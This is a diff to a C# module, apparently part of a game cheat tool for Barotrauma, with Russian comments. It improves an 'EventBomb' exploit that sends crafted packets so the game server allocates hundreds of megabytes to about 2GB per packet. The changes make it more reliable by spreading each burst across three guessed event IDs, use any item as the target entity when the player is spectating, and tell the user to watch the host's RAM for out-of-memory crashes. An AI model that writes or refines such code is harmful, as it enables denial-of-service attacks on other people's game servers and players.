@@ -41,15 +41,27 @@
 //            (собирается рефлексией: public record struct, ctor(T,int) + Write())
 //
 //  firstEventID = GameMain.Client.LastSentEntityEventID + 1 (public поле,
-//  сервер сам его присылает) → выравнивание ID гарантировано → событие
-//  ОБРАБОТАНО, не скипнуто. characterStateID=0 → не задержится в буфере
-//  (но ему и не нужно: аллокация происходит на ПАРСЕ, до BufferEvent).
+//  сервер присылает своё значение в каждом ingame-апдейте: GameServer:2173 →
+//  GameClient:2360). ГОНКА: легитные события нашего клиента двигают счётчик
+//  сервера между чтением зеркала и приходом бомбы → промах = skip-путь БЕЗ
+//  аллокации. ФИКС: клик шлёт бомбы ТРЕМЯ кандидатами ID (mirror+1/+2/+3) —
+//  промахи безвредны, а совпавший ID аллоцирует КАЖДЫЙ раз (счётчик сервера
+//  не двигается — исключение до инкремента).
+//
+//  УСЛОВИЯ (важно!):
+//  - РАУНД ЗАПУЩЕН — ОБЯЗАТЕЛЬНО: в лобби сервер дропает весь пакет целиком:
+//    `case UPDATE_INGAME: if (!GameStarted) { return; }` (GameServer:886)
+//  - ЖИВЫМ быть НЕ обязательно: аллокация происходит на ПАРСЕ пакета, до
+//    живостных гейтов (мёртвые дропаются в Update() ПОСЛЕ аллокации). Труп ок.
+//  - Спектатор БЕЗ персонажа: fallback на ЛЮБОЙ предмет из Item.ItemList.
+//  - Эффект смотреть в RAM СЕРВЕРА (диспетчер задач на хосте), не у себя.
+//  characterStateID=0 → не задержится в буфере (аллокация и так на парсе).
 //
 //  БОНУС-БАГ (не эксплойт): skip-путь делает msg.BitPosition += msgLength*8 —
 //  int overflow при msgLength ≥ 2^29 → BitPosition уезжает НАЗАД → ре-парсинг
 //  своих же байтов в следующей итерации цикла.
 //
-//  Работает на ОБОИХ транспортах, из раунда (в лобби нет entity).
+//  Работает на ОБОИХ транспортах, в раунде (лобби = дроп).
 // ============================================================================
 
 using System;
@@ -103,16 +115,18 @@ namespace CSHUB.Modules
             box.Buttons[0].OnClicked = (_, _) =>
             {
                 int ok = EventBombEngine.FireBurst(20, 0x0C800000); // ~201MB
-                GUI.AddMessage($"[EventBomb] CHURN: {ok}/20 бомб по ~201MB отправлено = ~{ok * 201}MB " +
-                    "занулено на сервере за секунду. Жми ещё для GC-шторма.", Color.Orange);
+                GUI.AddMessage($"[EventBomb] CHURN: {ok}/20 отправлено (3 кандидата ID). " +
+                    $"Смотри RAM СЕРВЕРА в диспетчере задач (пика ~{ok * 201}MB). " +
+                    "Если RAM не дёрнулась: (1) раунд запущен? (2) в логе сервера строка " +
+                    "'Exception thrown while reading segment' = промах ID — жми ещё.", Color.Orange);
                 return true;
             };
 
             box.Buttons[1].OnClicked = (_, _) =>
             {
                 int ok = EventBombEngine.FireBurst(5, 0x7FFFF000); // ~2GB
-                GUI.AddMessage($"[EventBomb] SHOT: {ok}/5 бомб по ~2GB отправлено. " +
-                    "На слабом хосте это OOM-кандидат, на жирном — пики по 2GB.", Color.Red);
+                GUI.AddMessage($"[EventBomb] SHOT: {ok}/5 по ~2GB отправлено. " +
+                    "Слабый хост = кандидат на OOM/фриз. Смотри RAM хоста.", Color.Red);
                 return true;
             };
 
@@ -152,30 +166,49 @@ namespace CSHUB.Modules
         public static int FireBurst(int count, int allocBytes)
         {
             if (GameMain.Client?.ClientPeer == null) { return 0; }
-            if (GameMain.Client.Character == null)
+
+            // entity: свой персонаж (живой ИЛИ труп — аллокация на парсе, живость
+            // неважна) → иначе ЛЮБОЙ предмет из Item.ItemList (для спектатора).
+            ushort entityId;
+            if (GameMain.Client.Character != null)
             {
-                GUI.AddMessage("[EventBomb] нужен раунд (нет персонажа = нет валидного entityID)", Color.Red);
-                return 0;
+                entityId = GameMain.Client.Character.ID;
             }
+            else
+            {
+                Item fallback = null;
+                foreach (Item it in Item.ItemList)
+                {
+                    if (it != null && !it.Removed) { fallback = it; break; }
+                }
+                if (fallback == null)
+                {
+                    GUI.AddMessage("[EventBomb] раунд не запущен или нет известных энтити. " +
+                        "НУЖЕН ЗАПУЩЕННЫЙ РАУНД: в лобби сервер дропает UPDATE_INGAME целиком " +
+                        "(GameServer: if (!GameStarted) return).", Color.Red);
+                    return 0;
+                }
+                entityId = fallback.ID;
+            }
+
             if (!EnsureReflection(out string err))
             {
                 GUI.AddMessage("[EventBomb] " + err, Color.Red);
                 return 0;
             }
 
-            ushort myEntityId = GameMain.Client.Character.ID;
-            // сервер ждёт событие с ID = LastSentEntityEventID + 1 (поле присылает сам сервер).
-            // ВАЖНО: обработка бомбы кидает исключение ДО sender.LastSentEntityEventID++,
-            // поэтому счётчик сервера НЕ двигается — ВЕСЬ burst шлёт ОДИН И ТОТ ЖЕ ID
-            // (иначе 2-й и дальше уйдут в skip-путь без аллокации).
-            ushort eventId = (ushort)(GameMain.Client.LastSentEntityEventID + 1);
+            // ТРИ кандидата event ID против гонки с легитными событиями:
+            // промахи уходят в skip-путь безвредно, совпавший аллоцирует,
+            // причём ВСЕ бомбы с совпавшим ID (счётчик не двигается).
+            ushort mirror = GameMain.Client.LastSentEntityEventID;
+            ushort[] candidates = { (ushort)(mirror + 1), (ushort)(mirror + 2), (ushort)(mirror + 3) };
 
             int sent = 0;
             for (int i = 0; i < count; i++)
             {
                 try
                 {
-                    if (SendOne(myEntityId, eventId, allocBytes)) { sent++; }
+                    if (SendOne(entityId, candidates[i % candidates.Length], allocBytes)) { sent++; }
                     else { break; }
                 }
                 catch (Exception e)
